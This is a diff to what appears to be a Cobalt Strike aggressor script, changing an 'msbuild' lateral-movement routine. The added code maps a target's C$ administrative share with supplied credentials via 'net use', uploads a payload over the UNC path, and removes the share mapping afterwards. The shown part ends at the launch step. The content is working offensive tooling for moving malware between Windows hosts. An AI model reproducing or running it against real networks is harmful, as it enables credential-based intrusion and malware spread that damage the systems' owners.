@@ -251,7 +251,18 @@ sub msbuild {
 	}
 
 	#upload
-	bupload_raw($1,'\\\\'. %args['target'] . '\\' . strrep($pay_dir, ":", "$") . $filename , $payload);
+	$unc = '\\\\'. %args['target'] . '\\' . strrep($pay_dir, ":", "$");
+	
+	if("user" in %args && "pass" in %args) {
+		bshell($1, 'net use \\\\'. %args['target'] . '\\C$ /user:' . %args['user'] . ' ' . %args['pass']);
+		sleep(5000);
+		bupload_raw($1, $unc . $filename , $payload);
+		sleep(2000);
+		bshell($1, 'net use \\\\'. %args['target'] . '\\C$ /delete');
+	}
+	else {
+		bupload_raw($1, $unc . $filename , $payload);
+	}
 
 	##########
 	# Launch #
